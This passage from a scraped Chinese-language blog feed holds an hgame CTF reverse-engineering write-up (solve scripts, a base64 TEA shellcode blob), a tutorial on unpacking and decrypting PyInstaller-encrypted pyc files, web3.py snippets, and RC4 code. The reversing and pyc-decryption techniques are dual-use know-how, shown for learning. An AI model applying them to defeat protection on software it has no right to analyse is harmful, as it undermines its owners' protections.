0x38, 0x30, 0x73, 0x38, 0xc1, 0x5e, 0xed, 0xb0, 0x29, 0x5a, 0x18, 0x40, 0xa7, 0xfd, 0xa, 0x1e, 0x78, 0x8b, 0x62, 0xdb, 0xf, 0x8f, 0x9c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]c = [0x4800, 0xf100, 0x4000, 0x2100, 0x3501, 0x6400, 0x7801, 0xf900, 0x1801, 0x5200, 0x2500, 0x5d01, 0x4700, 0xfd00, 0x6901, 0x5c00, 0xaf01, 0xb200, 0xec01, 0x5201, 0x4f01, 0x1a01, 0x5000, 0x8501, 0xcd00, 0x2300, 0xf800, 0xc00, 0xcf00, 0x3d01, 0x4501, 0x8200, 0xd201, 0x2901, 0xd501, 0x601, 0xa201, 0xde00, 0xa601, 0xca01, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]flag = '0123456789012345678901234567890123456789'res = [0 for i in range(40)]for i in range(40): x = a[i] + ord(flag[i]) y = x ^ b[i] z = (y &lt;&lt; 8) &amp; 0xff00 m = y >> 8 n = z + m写个 exp a = [0x9b, 0xa8, 0x2, 0xbc, 0xac, 0x9c, 0xce, 0xfa, 0x2, 0xb9, 0xff, 0x3a, 0x74, 0x48, 0x19, 0x69, 0xe8, 0x3, 0xcb, 0xc9, 0xff, 0xfc, 0x80, 0xd6, 0x8d, 0xd7, 0x72, 0x0, 0xa7, 0x1d, 0x3d, 0x99, 0x88, 0x99, 0xbf, 0xe8, 0x96, 0x2e, 0x5d, 0x57]b = [0xc9, 0xa9, 0xbd, 0x8b, 0x17, 0xc2, 0x6e, 0xf8, 0xf5, 0x6e, 0x63, 0x63, 0xd5, 0x46, 0x5d, 0x16, 0x98, 0x38, 0x30, 0x73, 0x38, 0xc1, 0x5e, 0xed, 0xb0, 0x29, 0x5a, 0x18, 0x40, 0xa7, 0xfd, 0xa, 0x1e, 0x78, 0x8b, 0x62, 0xdb, 0xf, 0x8f, 0x9c]c = [0x4800, 0xf100, 0x4000, 0x2100, 0x3501, 0x6400, 0x7801, 0xf900, 0x1801, 0x5200, 0x2500, 0x5d01, 0x4700, 0xfd00, 0x6901, 0x5c00, 0xaf01, 0xb200, 0xec01, 0x5201, 0x4f01, 0x1a01, 0x5000, 0x8501, 0xcd00, 0x2300, 0xf800, 0xc00, 0xcf00, 0x3d01, 0x4501, 0x8200, 0xd201, 0x2901, 0xd501, 0x601, 0xa201, 0xde00, 0xa601, 0xca01]c = [i for i in reversed(c)]flag=''for i in range(40): m = c[i] >> 8 n = (c[i] &amp; 0xff) &lt;&lt; 8 y = m + n y = y ^ b[i] y = y - a[i] flag += chr(y)print(flag)# hgame&#123;y0ur_rever5e_sk1ll_i5_very_g0od!!&#125;# shellcode 把 base64 字符串解码 import base64with open('data','wb') as f: f.write(base64.b64decode('VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D'))然后用 ida 打开 data 文件 _DWORD *__fastcall sub_0(unsigned int *a1)&#123; _DWORD *result; // rax unsigned int v2; // [rsp+20h] [rbp+0h] unsigned int v3; // [rsp+24h] [rbp+4h] int v4; // [rsp+28h] [rbp+8h] unsigned int i; // [rsp+40h] [rbp+20h] v2 = *a1; v3 = a1[1]; v4 = 0; for ( i = 0; i &lt; 0x20; ++i ) &#123; v4 -= 0x543210DD; v2 += ((v3 >> 5) + 33) ^ (v3 + v4) ^ (16 * v3 + 22); v3 += ((v2 >> 5) + 55) ^ (v2 + v4) ^ (16 * v2 + 44); &#125; *a1 = v2; result = a1 + 1; a1[1] = v3; return result;&#125;看来是普通的 tea 加密 from ctypes import *def encrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x543210DD k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(0) for i in range(32): total.value -= delta v0.value += ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) v1.value += ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) return v0.value, v1.valuedef decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x543210DD k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(-delta * 32) for i in range(32): v1.value -= ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) v0.value -= ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) total.value += delta return v0.value, v1.value# testif __name__ == \"__main__\": # 待加密的明文，两个 32 位整型，即 64bit 的明文数据 value = [0, 0] # 四个 key，每个是 32bit，即密钥长度为 128bit key = [22, 33, 44, 55] with open('flag.enc', 'rb') as f: s = f.read() for i in range(0, len(s), 8): value[0] = (s[i + 3] &lt;&lt; 24) + (s[i + 2] &lt;&lt; 16) + (s[i + 1] &lt;&lt; 8) + s[i] value[1] = (s[i + 7] &lt;&lt; 24) + (s[i + 6] &lt;&lt; 16) + (s[i + 5] &lt;&lt; 8) + s[i + 4] res = decrypt(value, key) bytearray.fromhex(hex(res[0])[2::]).decode() print(bytearray.fromhex(hex(res[0])[2::]).decode()[::-1],sep='', end='') print(bytearray.fromhex(hex(res[1])[2::]).decode()[::-1],sep='', end='')# hgame&#123;th1s_1s_th3_tutu's_h0mew0rk&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"逆向","slug":"逆向","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"}]},{"title":"python逆向","slug":"python逆向","date":"2023-01-14T02:12:08.000Z","updated":"2025-04-08T18:55:11.736Z","comments":true,"path":"python逆向/","link":"","permalink":"https://oacia.dev/python%E9%80%86%E5%90%91/","excerpt":"python 中的逆向最关键的就是要看到 python 源码，如果使用 ida 将会大大增加逆向的难度，所以使用好正确的工具和方法将会让逆向过程事半功倍。 python 逆向的流程为：test.exe–&gt;test.pyc–&gt;test.py 接下来我将介绍每一步所使用的工具以及到目前为止我所遇到的问题和解决的方法","text":"python 中的逆向最关键的就是要看到 python 源码，如果使用 ida 将会大大增加逆向的难度，所以使用好正确的工具和方法将会让逆向过程事半功倍。 python 逆向的流程为：test.exe–&gt;test.pyc–&gt;test.py 接下来我将介绍每一步所使用的工具以及到目前为止我所遇到的问题和解决的方法 # exe 转 pyc 这里所使用的工具为 pyinstxtractor 系统的 python 版本和 exe 编译时所使用的 python 版本必须相同，否则将会出现 &lt;filename&gt;_extracted/PYZ-00.pyz_extracted 内文件为空的情况 # pyinstaller 无–key 参数，未加密 用法为 python pyinstxtractor.py &lt;filename&gt; 然后在文件夹中就会出现 &lt;filename&gt;_extracted 文件夹，进入该文件夹后找到 &lt;filename&gt;.pyc 文件就可以进入下一步 如果遇到没有 &lt;filename&gt;.pyc 文件，但是有 &lt;filename&gt; 文件，那么首先需要用 010editor 打开 &lt;filename&gt; 文件，然后进入在 &lt;filename&gt;_extracted 内找到 struct.pyc 文件并用 010editor 打开，将前 16 个字节插入到 &lt;filename&gt; 文件的前面，然后将后缀改成 pyc 就可以了. # pyinstaller 有–key 参数，加密 pyinstaller 为我们提供了加密的功能，可以给我们的逆向工程造成一些困难 PS C:\\Users\\春荠> pyinstaller.exe -h ... --key KEY The key used to encrypt Python bytecode.这里用一个简单的例子演示一下 # main.pyimport checkif __name__ == '__main__': check.check_this()# check.pydef check_this(): str = input(\"plz enter your input:\") if str==\"123123\": print(\"right\") else: print(\"wrong\")随后使用命令 PS D:\\TRASHBIN\\pyinstaller--key> pyinstaller.exe -F --key oacia --upx-dir \"D:\\TOOLS\\Unpackers(程序脱壳机)\\upx\\upx394w\\upx394w\" .\\main.py得到 main.exe 可执行文件 拖到 ida 里面可以看到 main 函数是类似这种样子的 接下来我们使用 pyinstxtractor 解包一下 PS D:\\TRASHBIN\\pyinstaller--key\\dist> python D:\\TOOLS\\python逆向\\pyinstxtractor-master\\pyinstxtractor-master\\pyinstxtractor.py .\\main.exe在 .\\main.exe_extracted 文件夹内，有 main.pyc 文件，这是没有加密的 PS D:\\TRASHBIN\\pyinstaller--key\\dist\\main.exe_extracted> uncompyle6.exe .\\main.pyc# uncompyle6 version 3.9.0# Python bytecode version base 3.7.0 (3394)# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]# Embedded file name: main.pyimport checkif __name__ == '__main__': check.check_this()# okay decompiling .\\main.pyc然而当我们进入 .\\main.exe_extracted\\PYZ-00.pyz_extracted 内后，我们可以看到这里的文件都是被加密过的，可以看到后缀为 .encrypted 我们在 main.pyc 转换成 py 后的源码中看到这里调用了 check 这个包，我们也同样可以找到 check.pyc.encrypted 这个文件 现在要做的事情就是解密这个文件 寻找密钥 在 main.exe_extracted 文件夹内找到 pyimod00_crypto_key.pyc 文件，转成 py 后就可以得到密钥 00000000000oacia PS D:\\TRASHBIN\\pyinstaller--key\\dist\\main.exe_extracted> uncompyle6.exe .\\pyimod00_crypto_key.pyc# uncompyle6 version 3.9.0# Python bytecode version base 3.7.0 (3394)# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]# Embedded file name: build\\main\\pyimod00_crypto_key.pykey = '00000000000oacia'# okay decompiling .\\pyimod00_crypto_key.pyc 解密 pyc 使用如下代码进行解密 import tinyaesimport zlibCRYPT_BLOCK_SIZE = 16# 填入密钥key = bytes('00000000000oacia', 'utf-8')inf = open('check.pyc.encrypted', 'rb') # 打开加密文件outf = open('check.pyc', 'wb') # 输出文件iv = inf.read(CRYPT_BLOCK_SIZE)cipher = tinyaes.AES(key, iv)plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))outf.write(b'\\x42\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0')# 文件头，可以取 struct.pyc 的前 16 个字节outf.write(plaintext)inf.close()outf.close() 之后便可以得到真正的源码 PS D:\\TRASHBIN\\pyinstaller--key\\dist\\main.exe_extracted\\PYZ-00.pyz_extracted> uncompyle6.exe .\\check.pyc# uncompyle6 version 3.9.0# Python bytecode version base 3.7.0 (3394)# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]# Embedded file name: check.pydef check_this(): str = input('plz enter your input:') if str == '123123': print('right') else: print('wrong')# okay decompiling .\\check.pyc# pyc 转 py 这是我们想要看到源码最关键的一步 # uncompyle6 # 安装 pip install uncompyle6# 用法 uncompyle6.exe -o &lt;filename>.py &lt;filename>.pycuncompyle6 在 python39 以下都可以做到正常的反编译，但是对于 python39 及以上的版本，作者却没有进行支持，这时我们可以使用 pycdc 来帮助我们反编译 # pycdc # 安装 git clone https://github.com/zrax/pycdc.git想要使用这一个工具需要用到 cmake, 进入官网 https://cmake.org/download/ 然后找到自己的系统版本进行安装就可以使用了 pycdc 的用法是 ./pycdc.exe &lt;filename>.pycpycdc 的好处是可以反编译 python39 及以上版本的 pyc 文件 # 在线网站 当然，我认为最方便的方法还是使用在线网站:https://tool.lu/pyc 直接把 pyc 文件拖进去就可以看到 py 文件了， 要是像省赛这种不能联网的 nt 赛制还是老老实实用 github 上的离线工具吧 # pyc 转字节码 应对 pyc 转 py 失败的情况 标准的格式如下 import marshal, disf = open(\"simple.pyc\", \"rb\").read()code = marshal.loads(f[16:]) #这边从 16 位开始取因为是 python3 python2 从 8 位开始取dis.dis(code)注意在对 pyc 逆向的过程中，可能会出现 uncompyle6.exe 无法分析 pyc 的情况，那么可能的原因有如下几点 python 版本和 pyc 版本不一致，此时需要切换 python 版本 pyc 掺杂有花指令 出现这种情况，需要将花指令的部分删除，并且更改 co_code 的值， co_code 的值可以通过 python 代码 len(code.co_code) 得到， co_code 在 python 十六进制中的第三行，第十，十一个字节参考下图的位置 字节码提取出来后，如果感觉看字节码的逻辑麻烦的话，可以将字节码复制到 CHATGPT , 让 CHATGPT 帮忙转换成可读的 py 代码 # 附录 # pyc 结构 typedef struct &#123; PyObject_HEAD int co_argcount; /* 位置参数个数 */ int co_nlocals; /* 局部变量个数 */ int co_stacksize; /* 栈大小 */ int co_flags; PyObject *co_code; /* 字节码指令序列 */ PyObject *co_consts; /* 所有常量集合 */ PyObject *co_names; /* 所有符号名称集合 */ PyObject *co_varnames; /* 局部变量名称集合 */ PyObject *co_freevars; /* 闭包用的的变量名集合 */ PyObject *co_cellvars; /* 内部嵌套函数引用的变量名集合 */ /* The rest doesn’t count for hash/cmp */ PyObject *co_filename; /* 代码所在文件名 */ PyObject *co_name; /* 模块名|函数名|类名 */ int co_firstlineno; /* 代码块在文件中的起始行号 */ PyObject *co_lnotab; /* 字节码指令和行号的对应关系 */ void *co_zombieframe; /* for optimization only (see frameobject.c) */&#125; PyCodeObject; pyc 文件头部 前 4 个字节：03f3 0d0a，表示 python 版本 5-8 个字节：0e6b 905d，表示 pyc 文件修改时间 PyCodeObject 对象二进制编译结果 第 9 字节：63，TYPE_CODE 字段，也就是字符 c，值为 99，即 0x63，表示接下为是一个 PyCodeObject 对象 PyCodeObject 对象 ---- 全局参数 然后 4 个字节是 0x00 0000 00，code block 的位置参数个数 co_argument，这里是 0； 再接着 4 个字节是 0x00 0000 00， code block 中的局部变量个数 co_nlocals，这里是 0； 再接着 4 个字节是 0x01 0000 00， code block 需要的栈空间 co_stacksize，这里是 1； 再接着 4 个字节是 0x40 0000 00， co_flags，这里是 64； PyCodeObject 对象 ----code block 1 个字节 0x73 为 TYPE_CODE 字段， 表示该字段为 string 格式； 4 个字节 0x1a00 0000 表示 code block 段的数据部分占用 0x1a 个字节，即长度为 26； 接下来 26 个字节 6400 … 6402 0053 为该 TYPE_CODE 字段（数据类型 string）部分，也就是 pyc 文件中包含的字节码指令 # 字节码含义 pyc 的字节码可以在路径 python安装路径/include/opcode.h /* Auto-generated by Tools/scripts/generate_opcode_h.py */#ifndef Py_OPCODE_H#define Py_OPCODE_H#ifdef __cplusplusextern \"C\" &#123;#endif /* Instruction opcodes for compiled code */#define POP_TOP 1#define ROT_TWO 2#define ROT_THREE 3#define DUP_TOP 4#define DUP_TOP_TWO 5#define NOP 9#define UNARY_POSITIVE 10#define UNARY_NEGATIVE 11#define UNARY_NOT 12#define UNARY_INVERT 15#define BINARY_MATRIX_MULTIPLY 16#define INPLACE_MATRIX_MULTIPLY 17#define BINARY_POWER 19#define BINARY_MULTIPLY 20#define BINARY_MODULO 22#define BINARY_ADD 23#define BINARY_SUBTRACT 24#define BINARY_SUBSCR 25#define BINARY_FLOOR_DIVIDE 26#define BINARY_TRUE_DIVIDE 27#define INPLACE_FLOOR_DIVIDE 28#define INPLACE_TRUE_DIVIDE 29#define GET_AITER 50#define GET_ANEXT 51#define BEFORE_ASYNC_WITH 52#define INPLACE_ADD 55#define INPLACE_SUBTRACT 56#define INPLACE_MULTIPLY 57#define INPLACE_MODULO 59#define STORE_SUBSCR 60#define DELETE_SUBSCR 61#define BINARY_LSHIFT 62#define BINARY_RSHIFT 63#define BINARY_AND 64#define BINARY_XOR 65#define BINARY_OR 66#define INPLACE_POWER 67#define GET_ITER 68#define GET_YIELD_FROM_ITER 69#define PRINT_EXPR 70#define LOAD_BUILD_CLASS 71#define YIELD_FROM 72#define GET_AWAITABLE 73#define INPLACE_LSHIFT 75#define INPLACE_RSHIFT 76#define INPLACE_AND 77#define INPLACE_XOR 78#define INPLACE_OR 79#define BREAK_LOOP 80#define WITH_CLEANUP_START 81#define WITH_CLEANUP_FINISH 82#define RETURN_VALUE 83#define IMPORT_STAR 84#define SETUP_ANNOTATIONS 85#define YIELD_VALUE 86#define POP_BLOCK 87#define END_FINALLY 88#define POP_EXCEPT 89#define HAVE_ARGUMENT 90#define STORE_NAME 90#define DELETE_NAME 91#define UNPACK_SEQUENCE 92#define FOR_ITER 93#define UNPACK_EX 94#define STORE_ATTR 95#define DELETE_ATTR 96#define STORE_GLOBAL 97#define DELETE_GLOBAL 98#define LOAD_CONST 100#define LOAD_NAME 101#define BUILD_TUPLE 102#define BUILD_LIST 103#define BUILD_SET 104#define BUILD_MAP 105#define LOAD_ATTR 106#define COMPARE_OP 107#define IMPORT_NAME 108#define IMPORT_FROM 109#define JUMP_FORWARD 110#define JUMP_IF_FALSE_OR_POP 111#define JUMP_IF_TRUE_OR_POP 112#define JUMP_ABSOLUTE 113#define POP_JUMP_IF_FALSE 114#define POP_JUMP_IF_TRUE 115#define LOAD_GLOBAL 116#define CONTINUE_LOOP 119#define SETUP_LOOP 120#define SETUP_EXCEPT 121#define SETUP_FINALLY 122#define LOAD_FAST 124#define STORE_FAST 125#define DELETE_FAST 126#define RAISE_VARARGS 130#define CALL_FUNCTION 131#define MAKE_FUNCTION 132#define BUILD_SLICE 133#define LOAD_CLOSURE 135#define LOAD_DEREF 136#define STORE_DEREF 137#define DELETE_DEREF 138#define CALL_FUNCTION_KW 141#define CALL_FUNCTION_EX 142#define SETUP_WITH 143#define EXTENDED_ARG 144#define LIST_APPEND 145#define SET_ADD 146#define MAP_ADD 147#define LOAD_CLASSDEREF 148#define BUILD_LIST_UNPACK 149#define BUILD_MAP_UNPACK 150#define BUILD_MAP_UNPACK_WITH_CALL 151#define BUILD_TUPLE_UNPACK 152#define BUILD_SET_UNPACK 153#define SETUP_ASYNC_WITH 154#define FORMAT_VALUE 155#define BUILD_CONST_KEY_MAP 156#define BUILD_STRING 157#define BUILD_TUPLE_UNPACK_WITH_CALL 158#define LOAD_METHOD 160#define CALL_METHOD 161/* EXCEPT_HANDLER is a special, implicit block type which is created when entering an except handler. It is not an opcode but we define it here as we want it to be available to both frameobject.c and ceval.c, while remaining private.*/#define EXCEPT_HANDLER 257enum cmp_op &#123;PyCmp_LT=Py_LT, PyCmp_LE=Py_LE, PyCmp_EQ=Py_EQ, PyCmp_NE=Py_NE, PyCmp_GT=Py_GT, PyCmp_GE=Py_GE, PyCmp_IN, PyCmp_NOT_IN, PyCmp_IS, PyCmp_IS_NOT, PyCmp_EXC_MATCH, PyCmp_BAD&#125;;#define HAS_ARG(op) ((op) >= HAVE_ARGUMENT)#ifdef __cplusplus&#125;#endif#endif /* !Py_OPCODE_H */# pyc 魔数表 # copied from https://github.com/google/pytype/blob/main/pytype/pyc/magic.py\"\"\"Python version numbers and their encoding (\"magic number\").\"\"\"import struct# These constants are from Python-3.x.x/Lib/importlib/_bootstrap_external.pyPYTHON_MAGIC = &#123; # Python 1 20121: (1, 5), 50428: (1, 6), # Python 2 50823: (2, 0), 60202: (2, 1), 60717: (2, 2), 62011: (2, 3), # a0 62021: (2, 3), # a0 62041: (2, 4), # a0 62051: (2, 4), # a3 62061: (2, 4), # b1 62071: (2, 5), # a0 62081: (2, 5), # a0 62091: (2, 5), # a0 62092: (2, 5), # a0 62101: (2, 5), # b3 62111: (2, 5), # b3 62121: (2, 5), # c1 62131: (2, 5), # c2 62151: (2, 6), # a0 62161: (2, 6), # a1 62171: (2, 7), # a0 62181: (2, 7), # a0 62191: (2, 7), # a0 62201: (2, 7), # a0 62211: (2, 7), # a0 # Python 3 3000: (3, 0), 3010: (3, 0), 3020: (3, 0), 3030: (3, 0), 3040: (3, 0), 3050: (3, 0), 3060: (3, 0), 3061: (3, 0), 3071: (3, 0), 3081: (3, 0), 3091: (3, 0), 3101: (3, 0), 3103: (3, 0), 3111: (3, 0), # a4 3131: (3, 0), # a5 # Python 3.1 3141: (3, 1), # a0 3151: (3, 1), # a0 # Python 3.2 3160: (3, 2), # a0 3170: (3, 2), # a1 3180: (3, 2), # a2 # Python 3.3 3190: (3, 3), # a0 3200: (3, 3), # a0 3220: (3, 3), # a1 3230: (3, 3), # a4 # Python 3.4 3250: (3, 4), # a1 3260: (3, 4), # a1 3270: (3, 4), # a1 3280: (3, 4), # a1 3290: (3, 4), # a4 3300: (3, 4), # a4 3310: (3, 4), # rc2 # Python 3.5 3320: (3, 5), # a0 3330: (3, 5), # b1 3340: (3, 5), # b2 3350: (3, 5), # b2 3351: (3, 5), # 3.5.2 # Python 3.6 3360: (3, 6), # a0 3361: (3, 6), # a0 3370: (3, 6), # a1 3371: (3, 6), # a1 3372: (3, 6), # a1 3373: (3, 6), # b1 3375: (3, 6), # b1 3376: (3, 6), # b1 3377: (3, 6), # b1 3378: (3, 6), # b2 3379: (3, 6), # rc1 # Python 3.7 3390: (3, 7), # a1 3391: (3, 7), # a2 3392: (3, 7), # a4 3393: (3, 7), # b1 3394: (3, 7), # b5 # Python 3.8 3400: (3, 8), # a1 3401: (3, 8), # a1 3410: (3, 8), # a1 3411: (3, 8), # b2 3412: (3, 8), # b2 3413: (3, 8), # b4 # Python 3.9 3420: (3, 9), # a0 3421: (3, 9), # a0 3422: (3, 9), # a0 3423: (3, 9), # a2 3424: (3, 9), # a2 3425: (3, 9), # a2 # Python 3.10 3430: (3, 10), # a1 3431: (3, 10), # a1 3432: (3, 10), # a2 3433: (3, 10), # a2 3434: (3, 10), # a6 3435: (3, 10), # a7 3436: (3, 10), # b1 3437: (3, 10), # b1 3438: (3, 10), # b1 3439: (3, 10), # b1 # Python 3.11 3450: (3, 11), # a1 3451: (3, 11), # a1 3452: (3, 11), # a1 3453: (3, 11), # a1 3454: (3, 11), # a1 3455: (3, 11), # a1 3456: (3, 11), # a1 3457: (3, 11), # a1 3458: (3, 11), # a1 3459: (3, 11), # a1 3460: (3, 11), # a1 3461: (3, 11), # a1 3462: (3, 11), # a2 3463: (3, 11), # a3 3464: (3, 11), # a3 3465: (3, 11), # a3 3466: (3, 11), # a4 3467: (3, 11), # a4 3468: (3, 11), # a4 3469: (3, 11), # a4 3470: (3, 11), # a4 3471: (3, 11), # a4 3472: (3, 11), # a4 3473: (3, 11), # a4 3474: (3, 11), # a4 3475: (3, 11), # a5 3476: (3, 11), # a5 3477: (3, 11), # a5 3478: (3, 11), # a5 3479: (3, 11), # a5 3480: (3, 11), # a5 3481: (3, 11), # a5 3482: (3, 11), # a5 3483: (3, 11), # a5 3484: (3, 11), # a5 3485: (3, 11), # a5 3486: (3, 11), # a6 3487: (3, 11), # a6 3488: (3, 11), # a6 3489: (3, 11), # a6 3490: (3, 11), # a6 3491: (3, 11), # a6 3492: (3, 11), # a7 3493: (3, 11), # a7 3494: (3, 11), # a7 3495: (3, 11), # b4&#125;def magic_word_to_version(magic_word): \"\"\"Return the Python version belonging to the magic number in the pyc head. The magic number is encoded in the first two bytes of a .pyc file. It translates to a (major, minor) version. It never has a \"micro\" version, because Python bytecode encoding doesn't change between micro version. Arguments: magic_word: A 16 bit number, either as an integer or little-endian encoded as a string. Returns: A tuple (major, minor), e.g. (3, 7). \"\"\" if not isinstance(magic_word, int): magic_word = struct.unpack(\"&lt;H\", magic_word)[0] return PYTHON_MAGIC[magic_word]","categories":[],"tags":[{"name":"python逆向","slug":"python逆向","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"pyinstaller","slug":"pyinstaller","permalink":"https://oacia.dev/tags/pyinstaller/"},{"name":"uncompyle6","slug":"uncompyle6","permalink":"https://oacia.dev/tags/uncompyle6/"},{"name":"pycdc","slug":"pycdc","permalink":"https://oacia.dev/tags/pycdc/"}]},{"title":"在python中与web3交互","slug":"web3.py常用代码整理","date":"2023-01-13T16:00:00.000Z","updated":"2025-04-08T18:55:12.027Z","comments":true,"path":"web3.py常用代码整理/","link":"","permalink":"https://oacia.dev/web3.py%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86/","excerpt":"","text":"使用 web3.py 进行合约交互 # 部署合约 import jsonfrom web3 import Web3, HTTPProviderprivate_key = [钱包私钥]wallet = Web3.toChecksumAddress([钱包地址])w3 = Web3(HTTPProvider([链的RPC]))abi = json.loads([合约的ABI])code = [合约的字节码]newContract = w3.eth.contract(bytecode=code, abi=abi)nonce = w3.eth.getTransactionCount(wallet)gasPrice = w3.toWei('10', 'gwei')gasLimit = 4000000tx = &#123; 'nonce': nonce, 'gas': gasLimit, 'gasPrice': gasPrice, 'from': wallet, 'chainId': w3.eth.chainId&#125;transaction = newContract.constructor().buildTransaction(tx)signed_tx = w3.eth.account.sign_transaction(transaction, private_key)tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)transaction_hash = w3.toHex(tx_hash)tx_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)print(tx_receipt.contractAddress)# 调用合约中的函数 import jsonimport timefrom web3 import Web3, HTTPProvidercontract_address = [合约地址]private_key = [钱包私钥]wallet = Web3.toChecksumAddress([钱包地址])w3 = Web3(HTTPProvider([RPC]))w3.eth.defaultAccount = walletabi = json.loads([合约的ABI])contract = w3.eth.contract(address=contract_address, abi=abi)nonce = w3.eth.getTransactionCount(wallet)gasPrice = w3.toWei('5', 'gwei')gasLimit = 4000000tx = &#123; 'nonce': nonce, 'gas': gasLimit, 'gasPrice': gasPrice, 'from': wallet, 'value': w3.toWei(0.01,'ether')&#125;transaction = contract.functions.create().buildTransaction(tx)signed_tx = w3.eth.account.sign_transaction(transaction, private_key)tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)transaction_hash = w3.toHex(tx_hash)tx_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)print(transaction_hash)# 向某一个地址转账 import jsonimport timefrom web3 import Web3, HTTPProviderprivate_key = [钱包私钥]wallet = Web3.toChecksumAddress([钱包地址])w3 = Web3(HTTPProvider([RPC]))w3.eth.defaultAccount = walletto = Web3.toChecksumAddress([要转账的地址])nonce = w3.eth.get_transaction_count(wallet)tx = &#123; 'nonce': nonce, 'to': to, 'gas': 4000000, 'gasPrice': w3.toWei('30', 'gwei'), 'value': w3.toWei(0.01, 'ether'), 'chainId': w3.eth.chainId&#125;# 签名交易signed_tx = w3.eth.account.sign_transaction(tx, private_key)tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)# 查询一个地址的 ETH import jsonimport timefrom web3 import Web3, HTTPProviderw3 = Web3(HTTPProvider([RPC]))print(w3.fromWei(w3.eth.getBalance([需要查询的地址]), 'Ether'))","categories":[],"tags":[{"name":"智能合约","slug":"智能合约","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"},{"name":"web3","slug":"web3","permalink":"https://oacia.dev/tags/web3/"}]},{"title":"逆向常用算法","slug":"逆向常用算法","date":"2023-01-13T16:00:00.000Z","updated":"2025-04-08T18:55:12.227Z","comments":true,"path":"逆向常用算法/","link":"","permalink":"https://oacia.dev/%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/","excerpt":"","text":"对常用的逆向算法进行了整理 # RC4 def RC4(data, key): if type(data) == type('oacia'): # 判断是否为字符串 data = [ord(i) for i in data] if type(key) == type('oacia'): key = [ord(i) for i in key] S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4encrypt(plaintext, key): return RC4(plaintext, key)def RC4decrypt(ciphertext, key): return RC4(ciphertext, key)# Example usageplaintext = \"this is RC4,oacia\"key = \"secret\"# 对明文进行加密ciphertext = RC4encrypt(plaintext, key)print(f\"ciphertext:&#123;ciphertext&#125;\")# 对密文进行解密decrypted = RC4decrypt(ciphertext, key)print(f\"decrypted:&#123;decrypted&#125;\")'''ciphertext:[153, 94, 187, 111, 162, 205, 165, 134, 96, 136, 143, 240, 156, 135, 150, 94, 204]decrypted:[116, 104, 105, 115, 32, 105, 115, 32, 82, 67, 52, 44, 111, 97, 99, 105, 97]''' #include&lt;stdio.h>/*RC4 初始化函数*/void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)&#123; int i = 0, j = 0; char k[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i &lt; 256; i++) &#123; s[i] = i; k[i] = key[i % Len_k]; &#125; for (i = 0; i &lt; 256; i++) &#123; j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; &#125;&#125;/*RC4 加解密函数unsigned char* Data 加解密的数据unsigned long Len_D 加解密数据的长度unsigned char* key 密钥unsigned long Len_k 密钥长度*/void RC4(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) // 加解密&#123; unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k &lt; Len_D; k++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; &#125;&#125;void RC4encrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;void RC4decrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, 